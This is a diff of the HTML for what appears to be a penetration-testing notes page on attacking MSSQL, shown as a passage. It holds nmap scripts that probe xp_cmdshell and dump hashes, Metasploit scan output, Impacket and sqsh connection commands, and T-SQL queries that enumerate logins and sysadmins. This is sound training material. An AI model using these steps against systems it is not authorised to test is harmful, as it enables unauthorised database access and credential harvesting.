@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17452,257 +17475,410 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>By default, MSSQL uses ports <code>TCP/1433</code> and <code>UDP/1434</code>, and MySQL uses <code>TCP/3306</code>. However, when MSSQL operates in a "hidden" mode, it uses the <code>TCP/2433</code> port. </p>
 <h2 id="enumeration">Enumeration</h2>
 <p>Basic enumeration:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p1433<span class="w"> </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p1433<span class="w"> </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <p>If you don't know anything about the service:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes<span class="w"> </span>--script-args<span class="w"> </span>mssql.instance-port<span class="o">=</span><span class="m">1433</span>,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span><span class="nv">$ip</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes<span class="w"> </span>--script-args<span class="w"> </span>mssql.instance-port<span class="o">=</span><span class="m">1433</span>,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>nmap<span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes<span class="w"> </span>--script-args<span class="w"> </span>mssql.instance-port<span class="o">=</span><span class="m">1433</span>,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes<span class="w"> </span>--script-args<span class="w"> </span>mssql.instance-port<span class="o">=</span><span class="m">1433</span>,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <p>We can also use Metasploit to run an auxiliary scanner called <code>mssql_ping</code> that will scan the MSSQL service and provide helpful information in our footprinting process.</p>
 <h4 id="mssql-ping-in-metasploit">MSSQL Ping in Metasploit</h4>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="go">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="go">rhosts =&gt; 10.129.201.248</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="go">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; run</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="go">[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="go">[+] 10.129.201.248:       -    ServerName      = SQL-01</span>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="go">[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER</span>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="go">[+] 10.129.201.248:       -    IsClustered     = No</span>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="go">[+] 10.129.201.248:       -    Version         = 15.0.2000.5</span>
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="go">[+] 10.129.201.248:       -    tcp             = 1433</span>
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="go">[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query</span>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="go">[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)</span>
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="go">[*] Auxiliary module execution completed</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="go">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="go">rhosts =&gt; 10.129.201.248</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="go">msf6 auxiliary(scanner/mssql/mssql_ping) &gt; run</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="go">[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="go">[+] 10.129.201.248:       -    ServerName      = SQL-01</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="go">[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="go">[+] 10.129.201.248:       -    IsClustered     = No</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="go">[+] 10.129.201.248:       -    Version         = 15.0.2000.5</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="go">[+] 10.129.201.248:       -    tcp             = 1433</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="go">[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="go">[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="go">[*] Auxiliary module execution completed</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="connect-to-database">Connect to database:</h2>
 <h3 id="from-linux">From Linux</h3>
 <h4 id="sqsh">sqsh</h4>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="gp"># </span>Targeting<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>account:
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="go">sqsh -S $ip -U &lt;username&gt; -P &#39;MyPassword!&#39; -h</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="gp"># </span>Targeting<span class="w"> </span>Windows<span class="w"> </span>authentication
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="go">sqsh -S $ip -U .\\username -P &#39;MyPassword!&#39; -h</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="gp"># </span>-h:<span class="w"> </span>disable<span class="w"> </span>headers<span class="w"> </span>and<span class="w"> </span>footers<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>cleaner<span class="w"> </span>look.
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span>
+<span class="normal"><a href="#__codelineno-3-5">5</a></span>
+<span class="normal"><a href="#__codelineno-3-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="gp"># </span>Targeting<span class="w"> </span>a<span class="w"> </span><span class="nb">local</span><span class="w"> </span>account:
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="go">sqsh -S $ip -U &lt;username&gt; -P &#39;MyPassword!&#39; -h</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="gp"># </span>Targeting<span class="w"> </span>Windows<span class="w"> </span>authentication
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="go">sqsh -S $ip -U .\\username -P &#39;MyPassword!&#39; -h</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="gp"># </span>-h:<span class="w"> </span>disable<span class="w"> </span>headers<span class="w"> </span>and<span class="w"> </span>footers<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>cleaner<span class="w"> </span>look.
+</span></code></pre></div></td></tr></table></div>
 <h4 id="mssqlclientpy-from-impacket">mssqlclient.py from impacket</h4>
 <p>Alternatively, we can use the tool from Impacket with the name <code>mssqlclient.py</code>.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="go">mssqlclient.py -p $port username@$ip </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="go">mssqlclient.py -p $port username@$ip </span>
+</span></code></pre></div></td></tr></table></div>
 <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span>Administrator@<span class="nv">$ip</span><span class="w"> </span>-windows-auth<span class="w">  </span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># With python3 mssqlclient.py help you can see more options.</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Another example</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>mssqlclient.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$ip</span><span class="w"> </span>-windows-auth
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># Example:</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span>
+<span class="normal"><a href="#__codelineno-5-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span>Administrator@<span class="nv">$ip</span><span class="w"> </span>-windows-auth<span class="w">  </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="c1"># With python3 mssqlclient.py help you can see more options.</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="c1"># Another example</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>mssqlclient.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$ip</span><span class="w"> </span>-windows-auth
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="c1"># Example:</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="c1"># mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="from-windows">From Windows</h3>
 <h4 id="sqlcmd">sqlcmd</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sqlcmd -S &lt;server&gt; -U &lt;username&gt; -P &#39;MyPassword!&#39; -y 30 -Y 30
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a># When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>sqlcmd -S &lt;server&gt; -U &lt;username&gt; -P &#39;MyPassword!&#39; -y 30 -Y 30
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a># When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
+</span></code></pre></div></td></tr></table></div>
 <h3 id="from-gui-application">From GUI Application</h3>
 <h4 id="server-management-studio-or-ssms">Server Management Studio or SSMS</h4>
 <p>Download from: <a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms">SQL Server Management Studio or SSMS</a></p>
 <h4 id="dbeaver">dbeaver</h4>
 <p><a href="https://github.com/dbeaver/dbeaver">dbeaver</a> is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.</p>
 <p>To install <a href="https://github.com/dbeaver/dbeaver">dbeaver</a> using a Debian package we can download the release .deb package from <a href="https://github.com/dbeaver/dbeaver/releases">https://github.com/dbeaver/dbeaver/releases</a> and execute the following command:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>sudo dpkg -i dbeaver-&lt;version&gt;.deb
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a># run dbeaver in a second plane
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a> dbeaver &amp;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>sudo dpkg -i dbeaver-&lt;version&gt;.deb
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a># run dbeaver in a second plane
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a> dbeaver &amp;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="basic-mssql-commands">Basic mssql commands</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># Get Microsoft SQL server version
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>select @@version;
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a># Get usernames
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>select user_name()
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>go 
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a># We need to use GO after our query to execute the SQL syntax. 
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a># List databases
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>SELECT name FROM master.dbo.sysdatabases
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>go
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
-</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a># Select a database
-</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>USE $dbName
-</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>go
-</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>## Examples: Select a database master
-</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>## USE master
-</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>
-</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a># Check out which one is the current selected database
-</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>SELECT DB_NAME()
-</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>go
-</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>
-</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a># Show tables
-</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>SELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES
-</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>go
-</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>
-</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a># Select a database and show content of a specific table.  
-</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>USE $dbName
-</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>SELECT * FROM $tableName 
-</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>
-</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a># Example: Select all Data from Table &quot;users&quot;. The name of the table (&quot;users&quot;) was obtained when running the command for showing the tables.
-</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>SELECT * FROM users
-</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>go
-</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>
-</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a># Get a list of users in the domain
-</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>SELECT name FROM master..syslogins
-</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>go
-</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a>
-</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a># Get a list of users that are sysadmins
-</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a>SELECT name FROM master..syslogins WHERE sysadmin = 1
-</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a>go
-</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>
-</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a># And to make sure: 
-</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>SELECT is_srvrolemember(&#39;sysadmin&#39;)
-</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>go
-</span><span id="__span-8-46"><a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a># If your user is admin, it will return 1.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span>
+<span class="normal"><a href="#__codelineno-8-13">13</a></span>
+<span class="normal"><a href="#__codelineno-8-14">14</a></span>
+<span class="normal"><a href="#__codelineno-8-15">15</a></span>
+<span class="normal"><a href="#__codelineno-8-16">16</a></span>
+<span class="normal"><a href="#__codelineno-8-17">17</a></span>
+<span class="normal"><a href="#__codelineno-8-18">18</a></span>
